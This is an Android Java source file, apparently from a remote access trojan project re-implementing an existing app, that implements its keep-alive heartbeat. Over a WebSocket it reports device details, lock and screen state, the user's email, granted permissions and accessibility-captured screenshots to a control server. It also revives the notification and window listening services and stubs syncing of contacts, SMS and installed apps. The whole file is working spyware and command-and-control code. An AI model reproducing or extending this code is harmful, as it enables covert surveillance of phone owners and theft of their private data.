package com.vendor.rat.keepalive.thread;

import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.os.BatteryManager;
import android.os.Build;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.vendor.rat.MainApplication;
import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.service.CustomNotificationService;
import com.vendor.rat.service.MyAccessibilityService;

import java.io.ByteArrayOutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.TimerTask;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;

/**
 * Vendor: com.guard.wallet.thread.f
 * Main keep-alive heartbeat TimerTask.
 */
public final class KeepHeartThread extends TimerTask {

    private static final String TAG = "KeepHeartThread";
    public static final ReentrantLock lock = new ReentrantLock();

    // ADAPT: vendor uses s.a (RetryPolicy) for debug/heart/lock messages
    private final Object debugRetryPolicy;
    private final Object heartRetryPolicy;
    private final Object lockRetryPolicy;
    private final java.util.Timer timer = new java.util.Timer();
    private Integer state = 0;
    private final AtomicInteger httpServerFailCount = new AtomicInteger(0);
    private final AtomicInteger cacheTaskCounter = new AtomicInteger(6);
    private final AtomicBoolean cacheTaskActive = new AtomicBoolean(false);
    private String cachedInstallDate;  // 安装日期不变，只查一次
    private volatile String cachedWallpap = "";  // 缩略图缓存，每次 tick 异步更新

    public KeepHeartThread() {
        this.debugRetryPolicy = null; // TODO: VENDOR_VERIFY - new s.a(5000, 1)
        this.heartRetryPolicy = null; // TODO: VENDOR_VERIFY - new s.a(30000, 10)
        this.lockRetryPolicy = null;  // TODO: VENDOR_VERIFY - new s.a(30000, 10)
    }

    /**
     * Vendor: f.b() - checks services alive, restarts if needed
     * vendor thread/f.java 行 57-86
     */
    public static void checkServicesAlive() {
        Log.d(TAG, "checkServicesAlive");
        try {
            // 1. vendor: if (!utils.f.b.get()) { http.l.a(); }
            // locateValues 加载 — 暂用标志位跳过 (API 依赖)
            // TODO: VENDOR_VERIFY — locateValue/entryAppMap.json

            // 2. vendor: 如果无障碍服务存在且 listenWindows 未加载 → d0()
            MyAccessibilityService service = MyAccessibilityService.P();
            if (service != null) {
                // vendor: !MyAccessibilityService.P().V()
                // V() = listenWindows 已完全加载 (f226k >= 2)
                if (service.f226k.get() < 2) {
                    if (service.f226k.get() >= 1) {
                        // vendor: http.l.d() → /api/listen/windows.json (已加载过，刷新)
                        Log.d(TAG, "listenWindows 已加载过，触发远程刷新");
                        // TODO: VENDOR_VERIFY — API refresh
                    } else {
                        // vendor: MyAccessibilityService.P().d0() → 首次加载
                        Log.d(TAG, "首次加载 listenWindows");
                        service.d0();
                    }
                }
            }

            // 3. vendor: 激活通知监听
            if (CustomNotificationService.instance == null) {
                Log.d(TAG, "NotificationService not active, attempting activation");
                // vendor: 通过本地 HTTP 激活
                // TODO: VENDOR_VERIFY — local HTTP activation
            }
        } catch (Exception e) {
            Log.e(TAG, "checkServicesAlive error", e);
        }
    }

    /**
     * Vendor: f.d() - triggers data sync for packages/contacts/sms
     */
    public static void triggerDataSync() {
        // TODO: VENDOR_VERIFY - vendor checks permissions, submits DataSyncThread
        // for packages (type 2), contacts (type 1), sms (type 5)
        Log.d(TAG, "triggerDataSync");
    }

    /**
     * Vendor: f.a() - checks local HTTP server health
     */
    public void checkHttpServer() {
        // TODO: VENDOR_VERIFY - vendor GETs http://127.0.0.1:7910/version
        // if fails 5+ times, restarts server
        Log.d(TAG, "checkHttpServer");
    }

    /**
     * Vendor: f.c() - sends device running heartbeat
     */
    public void sendHeartbeat() {
        // TODO: VENDOR_VERIFY - vendor builds HeartBodyVO, wraps in MessageRecordVO
        // with intentCode "android.intent.action.DEVICE_RUNNING"
        Log.d(TAG, "sendHeartbeat");
    }

    /**
     * Vendor: f.e() - fetches cached tasks from server
     */
    public void fetchCacheTasks() {
        // TODO: VENDOR_VERIFY - vendor sends bridge message to /cacheTask
        // and HTTP request to /api/containerApi/getCacheTask
        Log.d(TAG, "fetchCacheTasks");
    }

    /**
     * Vendor: f.run() - main heartbeat loop
     */
    @Override
    public void run() {
        this.state = 1;
        if (lock.tryLock()) {
            Log.d(TAG, "keep heart thread is running");
            try {
                // Phase 4: WebSocket 连接管理 + 心跳 (对齐 vendor KeepHeartThread)
                checkAndConnectWebSocket();
                sendWebSocketPing();

                checkServicesAlive();
                checkHttpServer();
                // vendor: noCompletes API → StrategyThread 触发保活自动化
                // ADAPT: 由于没有真实 API，直接触发策略检查
                StrategyThread.triggerKeepAliveIfNeeded();
                triggerDataSync();
                fetchCacheTasks();
            } catch (Exception e) {
                Log.e(TAG, "KeepHeartThread error", e);
            } finally {
                lock.unlock();
            }
        }
    }

    // ============ WebSocket 连接管理 (Phase 4) ============

    /**
     * 检查 WebSocket 连接状态，未连接则懒启动
     * 对齐 vendor: KeepHeartThread 每次 tick 检查 bridge WebSocket
     */
    private void checkAndConnectWebSocket() {
        try {
            NetworkManager nm = NetworkManager.getInstance();
            if (!nm.isWebSocketConnected()) {
                Log.d(TAG, "WebSocket not connected, attempting connect...");
                nm.connectWebSocket();
            }
        } catch (Exception e) {
            Log.w(TAG, "WebSocket connect check failed", e);
        }
    }

    /**
     * 发送 WebSocket 心跳 (subc="ping")
     * 对齐 vendor: 每次 tick 发送设备状态 + 缩略图到服务端
     * Laravel DeviceStatusService.parseDeviceParams() 用 parse_str() 解析 msg 字段
     */
    private void sendWebSocketPing() {
        try {
            NetworkManager nm = NetworkManager.getInstance();
            if (nm.isWebSocketConnected() && nm.getWebSocketClient() != null) {
                String statusParams = buildStatusParams();
                nm.getWebSocketClient().sendPing(statusParams);
                Log.d(TAG, "WebSocket ping sent");
                // 异步截取缩略图，供下次 tick 使用
                captureWallpapAsync();
            }
        } catch (Exception e) {
            Log.w(TAG, "WebSocket ping failed", e);
        }
    }

    /**
     * 构建 URL-encoded 设备状态参数
     * 对齐 Laravel DeviceStatusService.parseDeviceParams() 期望的字段:
     *   phone_name, model, android_version, battery_charge,
     *   accessibility, country, user_email, install_date
     */
    private String buildStatusParams() {
        StringBuilder sb = new StringBuilder();
        sb.append("phone_name=").append(encode(getPhoneName()));
        sb.append("&model=").append(encode(Build.MODEL));
        sb.append("&android_version=").append(encode(Build.VERSION.RELEASE));
        sb.append("&battery_charge=").append(encode(getBatteryLevel()));
        sb.append("&accessibility=").append(isAccessibilityEnabled() ? "1" : "0");
        sb.append("&activz=").append(getScreenState());
        sb.append("&has_password=").append(hasLockPassword() ? "1" : "0");
        sb.append("&network=").append(encode(getNetworkType()));
        sb.append("&country=").append(encode(getCountryCode()));
        sb.append("&user_email=").append(encode(getUserEmail()));
        sb.append("&install_date=").append(encode(getInstallDate()));
        sb.append("&phone_id=").append(encode(NetworkManager.getInstance().getDeviceId()));
        // 权限状态 (Phase 7)
        sb.append("&perm_sms=").append(hasPerm("android.permission.READ_SMS") ? "1" : "0");
        sb.append("&perm_contacts=").append(hasPerm("android.permission.READ_CONTACTS") ? "1" : "0");
        sb.append("&perm_location=").append(hasPerm("android.permission.ACCESS_FINE_LOCATION") ? "1" : "0");
        sb.append("&perm_camera=").append(hasPerm("android.permission.CAMERA") ? "1" : "0");
        sb.append("&perm_mic=").append(hasPerm("android.permission.RECORD_AUDIO") ? "1" : "0");
        sb.append("&perm_storage=").append(hasPerm("android.permission.READ_EXTERNAL_STORAGE") ? "1" : "0");
        sb.append("&perm_phone=").append(hasPerm("android.permission.READ_PHONE_STATE") ? "1" : "0");
        // 缩略图 (上次 tick 异步截取的缓存)
        if (cachedWallpap != null && !cachedWallpap.isEmpty()) {
            sb.append("&wallpap=").append(encode(cachedWallpap));
        }
        return sb.toString();
    }

    private String getPhoneName() {
        // Build.DEVICE = 设备代号, Build.MODEL = 完整型号名
        String device = Build.DEVICE;
        return (device != null && !device.isEmpty()) ? device : Build.MODEL;
    }

    private String getBatteryLevel() {
        try {
            MainApplication app = MainApplication.getInstance();
            if (app != null && app.getApplication() != null) {
                IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryStatus = app.getApplication().registerReceiver(null, filter);
                if (batteryStatus != null) {
                    int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                    int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                    boolean charging = status == BatteryManager.BATTERY_STATUS_CHARGING
                            || status == BatteryManager.BATTERY_STATUS_FULL;
                    if (level >= 0 && scale > 0) {
                        int pct = (int) ((level / (float) scale) * 100);
                        // 格式: t~数字 (充电中) / f~数字 (未充电)
                        return (charging ? "t~" : "f~") + pct;
                    }
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "getBatteryLevel failed", e);
        }
        return "f~0";
    }

    private boolean isAccessibilityEnabled() {
        return MyAccessibilityService.P() != null;
    }

    private String getCountryCode() {
        return java.util.Locale.getDefault().getCountry();
    }

    /**
     * 屏幕状态:
     *   0 = 亮屏已锁
     *   1 = 息屏已锁
     *   2 = 亮屏解锁
     *   3 = 息屏解锁
     */
    private String getScreenState() {
        try {
            MainApplication app = MainApplication.getInstance();
            if (app != null && app.getApplication() != null) {
                Context ctx = app.getApplication();
                PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
                KeyguardManager km = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
                boolean screenOn = pm != null && pm.isInteractive();
                boolean locked = km != null && km.isKeyguardLocked();
                if (screenOn && locked) return "0";
                if (!screenOn && locked) return "1";
                if (screenOn && !locked) return "2";
                return "3"; // !screenOn && !locked
            }
        } catch (Exception e) {
            Log.w(TAG, "getScreenState failed", e);
        }
        return "1";
    }

    /**
     * 是否设置了锁屏密码
     */
    private boolean hasLockPassword() {
        try {
            MainApplication app = MainApplication.getInstance();
            if (app != null && app.getApplication() != null) {
                KeyguardManager km = (KeyguardManager) app.getApplication()
                    .getSystemService(Context.KEYGUARD_SERVICE);
                return km != null && km.isDeviceSecure();
            }
        } catch (Exception e) {
            Log.w(TAG, "hasLockPassword failed", e);
        }
        return false;
    }

    /**
     * 网络类型: WIFI / 4G / 5G / MOBILE / NONE
     */
    private String getNetworkType() {
        try {
            MainApplication app = MainApplication.getInstance();
            if (app != null && app.getApplication() != null) {
                Context ctx = app.getApplication();
                ConnectivityManager cm = (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
                if (cm == null) return "NONE";

                android.net.Network network = cm.getActiveNetwork();
                if (network == null) return "NONE";

                NetworkCapabilities caps = cm.getNetworkCapabilities(network);
                if (caps == null) return "NONE";

                if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) {
                    return "WIFI";
                }
                if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                    TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                    if (tm != null) {
                        int type = tm.getDataNetworkType();
                        if (type == TelephonyManager.NETWORK_TYPE_NR) return "5G";
                        if (type == TelephonyManager.NETWORK_TYPE_LTE) return "4G";
                    }
                    return "MOBILE";
                }
            }
        } catch (Exception e) {
            Log.w(TAG, "getNetworkType failed", e);
        }
        return "NONE";
    }

    private String getUserEmail() {
        MainApplication app = MainApplication.getInstance();
        if (app == null || app.getConfig() == null) return "";

        String email = app.getConfig().getUserEmail();
        String secret = app.getConfig().getDeviceAuthSecret();
        if (email == null || email.isEmpty()) return "";

        // 无 secret 时发送纯 email (服务端会拒绝认证但仍接收消息)
        if (secret == null || secret.isEmpty()) return email;

        // 生成 Laravel DeviceTokenService 格式: email||hmac.buildId.timestamp
        // hmac = hash_hmac('sha256', "{email}|{buildId}|{timestamp}", secret)
        try {
            int buildId = 1;
            long timestamp = System.currentTimeMillis() / 1000;
            String payload = email + "|" + buildId + "|" + timestamp;

            Mac mac = Mac.getInstance("HmacSHA256");
            mac.init(new SecretKeySpec(secret.getBytes("UTF-8"), "HmacSHA256"));
            byte[] hmacBytes = mac.doFinal(payload.getBytes("UTF-8"));

            StringBuilder hmacHex = new StringBuilder();
            for (byte b : hmacBytes) {
                hmacHex.append(String.format("%02x", b));
            }

            return email + "||" + hmacHex.toString() + "." + buildId + "." + timestamp;
        } catch (Exception e) {
            Log.w(TAG, "generateDeviceToken failed", e);
            return email;
        }
    }

    private String getInstallDate() {
        if (cachedInstallDate != null) {
            return cachedInstallDate;
        }
        try {
            MainApplication app = MainApplication.getInstance();
            if (app != null && app.getApplication() != null) {
                long installTime = app.getApplication().getPackageManager()
                    .getPackageInfo(app.getApplication().getPackageName(), 0)
                    .firstInstallTime;
                cachedInstallDate = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                    java.util.Locale.US).format(new java.util.Date(installTime));
                return cachedInstallDate;
            }
        } catch (Exception e) {
            Log.w(TAG, "getInstallDate failed", e);
        }
        return "";
    }

    private static String encode(String value) {
        if (value == null) return "";
        try {
            return URLEncoder.encode(value, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            return value;
        }
    }

    private boolean hasPerm(String permission) {
        try {
            MainApplication app = MainApplication.getInstance();
            if (app != null && app.getApplication() != null) {
                return app.getApplication().checkSelfPermission(permission)
                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
            }
        } catch (Exception e) {
            // ignore
        }
        return false;
    }

    /**
     * 异步截取缩略图，缓存为 base64 供下次 ping 使用
     * 对齐 vendor: wallpap 字段 — 小尺寸 PNG 缩略图
     */
    private void captureWallpapAsync() {
        MyAccessibilityService service = MyAccessibilityService.P();
        if (service == null) return;

        service.takeScreenshotAsync(new MyAccessibilityService.ScreenshotCallback() {
            @Override
            public void onScreenshot(Bitmap bitmap) {
                try {
                    // 缩放到 45x45 (对齐 vendor wallpap 尺寸)
                    Bitmap thumb = Bitmap.createScaledBitmap(bitmap, 45, 45, true);
                    bitmap.recycle();

                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    thumb.compress(Bitmap.CompressFormat.PNG, 100, baos);
                    thumb.recycle();

                    cachedWallpap = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                } catch (Exception e) {
                    Log.w(TAG, "captureWallpap failed", e);
                }
            }

            @Override
            public void onError(String error) {
                // 截图失败不影响心跳，保留上次缓存
            }
        });
    }
}
